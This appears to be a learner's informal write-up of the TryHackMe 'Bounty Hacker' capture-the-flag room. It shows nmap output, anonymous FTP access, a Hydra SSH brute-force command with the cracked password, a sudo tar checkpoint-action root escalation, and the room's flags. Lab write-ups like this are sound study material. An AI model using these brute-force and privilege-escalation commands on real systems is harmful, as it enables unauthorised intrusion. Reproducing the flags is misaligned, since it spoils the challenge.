https://tryhackme.com/room/cowboyhacker
Notes + Key Takeaway

# Anonymous use and access on the ftp port
# Attacking username.txt with Hyrda and escalation there after
# Privilege escalation through exploiting sudo and tar privelages 





Need to restart the machine, was hanging up its ftp server.

Task 1 and 2 are jokes.

New ip is 10.10.104.230
Nmap scan: nmap -sC -sV - 10.10.255.118  


Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-03 10:52 EST
Nmap scan report for 10.10.255.118
Host is up (0.18s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.98.64
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


Found information on the ftp server, possible username and password provided in clear text. 
Who wrote the task list?  
Opening the webpage up shows some dialogue from cowboy bepop and a jpb file.
May need to find hidden directories? 
Hint Have you visited FTP?
I actually don’t know how to access ftp, researching for now. 



Found https://phoenixnap.com/kb/linux-ftp

ftp 10.10.255.118


Tried the Anonymous username and logged in with no password?
Ls returned. 229 Entering Extended Passive Mode (|||10752|)?



ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
Same issue when ftp’ing and entering passive mode. 
In doing more research with (229 Entering Extended Passive Mode) Found a video explaining a work around. 


Explained that ftp> passive needed to be used after logging in.
Connected to 10.10.104.230.
220 (vsFTPd 3.0.3)
Name (10.10.104.230:kali): Anonymous
230 Login successful.


Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
Locks.txt results 
ftp> less lock.txt
Failed to open file.
ftp> less locks.txt

rEddrAGON          ReDdr4g0nSynd!cat3  Dr@gOn$yn9icat3        R3DDr46ONSYndIC@Te
ReddRA60N          R3dDrag0nSynd1c4te    dRa6oN5YNDiCATE     ReDDR4g0n5ynDIc4te
R3Dr4gOn2044        RedDr4gonSynd1cat3    R3dDRaG0Nsynd1c@T3  Synd1c4teDr@g0n
reddRAg0N            REddRaG0N5yNdIc47e    Dra6oN$yndIC@t3     4L1mi6H71StHeB357  
ReDdrag0n$ynd1cate  Dr@gOn$yND1C4Te  RedDr@gonSyn9ic47e        REd$yNdIc47e
dr@goN5YNd1c@73     rEDdrAGOnSyNDiCat3    rEDdragOn$ynd1c473  DrAgoN5ynD1cATE
r3ddr@g0N  ReDSynd1ca7e


Task.txt results 
ftp> less task.txt



1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
Task doesn’t seem helpful, but I grabbed both of the files with mget.
May be able to use the locks against a known username. Although as of now, not really sure what the username is?
By accident, found the username or the answer to the question in the task list.
At the end there is a “-lin”

I already see the answer for What service can you brute force with the text file found?

SSH

What is the users password?
Found a basic hydra command which came to 
hydra -l lin -P locks.txt 10.10.104.230 ssh

Results: 
└─$ hydra -l lin -P locks.txt 10.10.104.230 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-03 11:15:45

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.104.230:22/
[22][ssh] host: 10.10.104.230   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 11:15:50

 Now that I have the username: lin and the pss: RedDr4gonSynd1cat3
I can use the command ssh lin@10.10.104.230's
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ ssh lin@10.10.104.230 
lin@10.10.104.230's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$
ls returned a lonely file called user.txt
THM{CR1M3_SyNd1C4T3}

root.txt 
Kind of weird to just ask for a root.txt folder when I only see the user.txt. Need to check permission with sudo. Command run 
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Sorry, try again.
[sudo] password for lin: 
Sorry, try again.
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
Seems like with can run /bin/tar as root, which may open the possibility of launching a payload from a reverse shell. Previous experience in the last box where this was being asked for. 
Going back to the gtfo bins which was the original location for the payload.
Searching /bin/tar and found https://gtfobins.github.io/gtfobins/tar/

Results here. 

in@bountyhacker:~/Desktop$     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
whoami: not found
# ls
user.txt
# 
# ls
user.txt
# 

    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# # tar: Removing leading `/' from member names
# # whoami
root

weird because I still only see the file which makes me thing something is wrong here, starting over.,
when running sudo -l I have all permission which is even stranger.
Starting over with the command I found the root.txt with another run through.

THM{80UN7Y_h4cK3r}